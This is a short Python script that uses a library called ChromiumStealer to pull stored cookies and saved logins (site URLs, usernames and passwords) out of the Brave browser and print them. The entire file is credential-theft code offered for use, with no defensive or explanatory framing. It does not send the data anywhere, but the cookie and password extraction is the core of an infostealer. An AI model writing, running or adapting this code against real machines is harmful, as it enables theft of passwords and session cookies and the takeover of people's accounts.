from ChromiumStealer.stealer import ChromiumStealer
from ChromiumStealer.browsers import Browsers

stealer = ChromiumStealer(Browsers.Brave)

for host, cookie_name, cookie_value in stealer.cookies():
    print(host, cookie_name, cookie_value)

for url, username, password in stealer.logins():
    print(url, username, password)